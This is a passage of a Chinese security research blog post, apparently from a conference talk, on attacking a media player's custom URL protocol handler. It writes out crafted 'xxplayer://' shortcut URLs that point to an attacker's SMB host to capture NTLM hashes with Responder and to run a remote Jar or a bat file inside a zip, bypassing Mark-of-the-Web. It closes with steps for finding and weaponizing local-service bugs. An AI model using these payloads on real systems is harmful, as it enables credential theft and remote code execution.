class="language-plaintext highlighter-rouge">http://www.baidu.com</code>。</p> <p>接着我们发现只要<code class="language-plaintext highlighter-rouge">url</code>参数值为<code class="language-plaintext highlighter-rouge">xxx://xxx.xxx/</code>的格式即可，那么我们尝试将<code class="language-plaintext highlighter-rouge">url</code>参数值修改为<code class="language-plaintext highlighter-rouge">file://172.16.176.176/netntlm</code>，也就变成这样：<code class="language-plaintext highlighter-rouge">xxplayer://action.cmd/createshortcut_url?url=file://172.16.176.176/netntlm&amp;name=123</code>，在机器上<code class="language-plaintext highlighter-rouge">responder</code>监听一下，当打开快捷方式时收到了NTLM Hash：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16756130536051.jpg" alt="" /></p> <p>除了获取NTLM Hash，我们还可以在Ubuntu上开一个SMB服务，然后将<code class="language-plaintext highlighter-rouge">url</code>参数设为使用<code class="language-plaintext highlighter-rouge">\\172.16.176.176\share\Test.exe</code>，使用快捷方式打开共享文件，发现确实可以打开EXE文件，但是会有文件信任的安全警告（Mark-of-the-Web）。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16756160973381.jpg" alt="" /></p> <p>这里可以通过<code class="language-plaintext highlighter-rouge">jar</code>文件形式去绕过，打包一个打开计算器的Jar包放在共享目录下，然后将<code class="language-plaintext highlighter-rouge">url</code>参数设为使用<code class="language-plaintext highlighter-rouge">\\172.16.176.176\share\1.jar</code>。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16756162884409.jpg" alt="" /></p> <p>访问<code class="language-plaintext highlighter-rouge">xxplayer://action.cmd/createshortcut_url?url=\\172.16.176.225\share\1.jar&amp;name=123</code>，创建快捷方式，打开快捷方式，执行Jar包启动计算器，这样我们就实现了1 Click执行任意命令。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028772455266.jpg" alt="" /></p> <p>使用远程Jar包的方式来达到任意命令执行还是有局限性，如果目标机器不存在Java环境就无法执行，因此在对文件信任机制的研究发现在<code class="language-plaintext highlighter-rouge">smb</code>共享文件中打开<code class="language-plaintext highlighter-rouge">zip</code>压缩包内的<code class="language-plaintext highlighter-rouge">bat</code>文件，不会有任何弹窗提示直接执行<code class="language-plaintext highlighter-rouge">bat</code>文件内容。</p> <p>因此我们可以在共享文件夹中创建<code class="language-plaintext highlighter-rouge">1.zip</code>，放入内容为<code class="language-plaintext highlighter-rouge">calc</code>的<code class="language-plaintext highlighter-rouge">1.bat</code>文件。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16756704688552.jpg" alt="" /></p> <p>将<code class="language-plaintext highlighter-rouge">url</code>参数值设为<code class="language-plaintext highlighter-rouge">\\172.16.176.225\share\1.zip\1.bat</code>，然后访问<code class="language-plaintext highlighter-rouge">xxplayer://action.cmd/createshortcut_url?url=\\172.16.176.225\share\1.zip\1.bat&amp;name=123</code>创建桌面快捷方式，打开快捷方式即可执行<code class="language-plaintext highlighter-rouge">bat</code>文件，最终达到不需要任何依赖的情况下执行任意命令。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028772348064.jpg" alt="" /></p> <h2 id="总结">总结</h2> <p>简单总结一下以上两类客户端的攻击入口、RCE风险和影响面。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028779762348.jpg" alt="" /></p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028780061810.jpg" alt="" /></p> <p>关于客户端本地开启的网络协议问题，我总结出如下几步可以快速的进行漏洞发现:</p> <ol> <li>找到客户端启动的本地网络服务（TCP、UDP），这个可以用火绒剑或者CMD的方式查看；</li> <li>有本地监听的情况下，找到对应的程序以及加载的DLL，通过IDA根据端口号找到监听的点，如果是C/C++的程序一般找bind这个函数就能快速定位到；</li> <li>向上回溯找调用链，并根据网络服务的返回结果，例如HTTP访问会有一段字符串或者响应头的一些字符串，定位到代码处理逻辑；</li> <li>如果逻辑对应上了，那就接着找程序的导入表是否存在敏感的函数，例如：CreateProcess、WinExec、ShellExec，如果存在则可以向上回溯看看是否与网络服务监听点有联系；</li> <li>当条件都满足的时候就想尽办法，通过断点调试等操作，找传参或数据传输格式，看看可控内容是否可达敏感的函数处；</li> <li>根据代码逻辑构造PoC触发漏洞，并尝试武器化利用。</li> </ol> <h2 id="致谢">致谢</h2> <p>在文章的最后，我要感谢公司部门领导和同事对本议题的贡献和帮助（以下排名不分先后），感谢字节跳动安全中心对于本次沙龙的筹办和策划。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028782795487.jpg" alt="" /></p> </article> <div class="page-navigation code"> <a class="home" href="http://localhost:4000/" title="Back to Index">INDEX</a> <span> &middot; </span> <a class="prev" href="http://localhost:4000/archives/2022-08-18/1" title="PREV: 我眼中的红队">&gt;&gt;</a> </div> </div> <div class="footer"> <span class="block">&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-2021</span> </div> <script src="/fancybox/lib/jquery-1.10.2.min.js"></script> <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script> <script> $(document).ready(function() { $("article img").each(function() { var strA = "<a style='text-decoration: none;' id='imgid' href='" + this.src + "'></a>"; $(this).wrapAll(strA); }); $(".block").html("&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-" + (new Date()).getFullYear()); }); $("#imgid").fancybox({ openEffect : 'elastic', closeEffect : 'elastic', }); </script> </body> </html>
